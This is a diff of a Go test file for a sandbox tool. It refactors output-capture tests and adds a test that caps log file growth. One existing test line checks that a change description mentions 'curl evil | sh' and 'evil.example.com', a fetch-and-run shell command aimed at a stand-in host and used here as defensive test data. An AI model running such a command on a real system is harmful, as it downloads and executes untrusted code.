@@ -1,9 +1,12 @@
 package sandbox
 
 import (
+	"os"
 	"strings"
 	"testing"
 	"time"
+
+	"github.com/kjmaguire/drydock/internal/proc"
 )
 
 func TestParseConfigFillsDefaultsAndRefusesWhatCannotWork(t *testing.T) {
@@ -101,18 +104,18 @@ func TestContainerDirStaysInsideTheWorkingFolder(t *testing.T) {
 }
 
 func TestCaptureKeepsTheHeadAndTheTailOfLongOutput(t *testing.T) {
-	c := newCapture()
+	c := &proc.HeadTail{Head: headBytes, Tail: tailBytes}
 	_, _ = c.Write([]byte("short"))
-	if out, n, cut := c.text(); out != "short" || n != 5 || cut {
+	if out, n, cut := c.Text(); out != "short" || n != 5 || cut {
 		t.Fatalf("%q %d %v", out, n, cut)
 	}
-	c = newCapture()
+	c = &proc.HeadTail{Head: headBytes, Tail: tailBytes}
 	big := strings.Repeat("a", headBytes) + strings.Repeat("m", 100000) + strings.Repeat("z", tailBytes)
 	for i := 0; i < len(big); i += 777 {
 		end := min(i+777, len(big))
 		_, _ = c.Write([]byte(big[i:end]))
 	}
-	out, n, cut := c.text()
+	out, n, cut := c.Text()
 	if !cut || n != int64(len(big)) || !strings.HasPrefix(out, strings.Repeat("a", headBytes)) || !strings.HasSuffix(out, strings.Repeat("z", tailBytes)) || strings.Contains(out, "mmmm") {
 		t.Fatalf("cut=%v n=%d len(out)=%d", cut, n, len(out))
 	}
@@ -195,5 +198,27 @@ func TestDiffNamesWhatChangedInADefinition(t *testing.T) {
 	first := strings.Join(Diff(nil, changed), "\n")
 	if !strings.Contains(first, "no definition has been confirmed yet") || !strings.Contains(first, "curl evil | sh") || !strings.Contains(first, "evil.example.com") {
 		t.Errorf("a definition that was never confirmed is not described:\n%s", first)
+	}
+}
+
+// A command's log file stops growing at its limit, so a command that prints without end cannot fill the disk, and the command
+// is not told that anything failed (audit 2026-10-16, M6).
+func TestALogFileStopsGrowingAtItsLimit(t *testing.T) {
+	f, err := os.CreateTemp(t.TempDir(), "log")
+	if err != nil {
+		t.Fatal(err)
+	}
+	defer f.Close()
+	l := &limitedFile{f: f, max: 1 << 10}
+	chunk := []byte(strings.Repeat("x", 300))
+	for i := 0; i < 20; i++ {
+		if n, err := l.Write(chunk); n != len(chunk) || err != nil {
+			t.Fatalf("write %d: %d %v", i, n, err)
+		}
+	}
+	st, _ := f.Stat()
+	b, _ := os.ReadFile(f.Name())
+	if st.Size() > 1<<10+200 || !strings.Contains(string(b), "the log stops here") || strings.Count(string(b), "x") != 1<<10 {
+		t.Fatalf("log of %d bytes with %d kept: %q", st.Size(), strings.Count(string(b), "x"), b[len(b)-80:])
 	}
 }
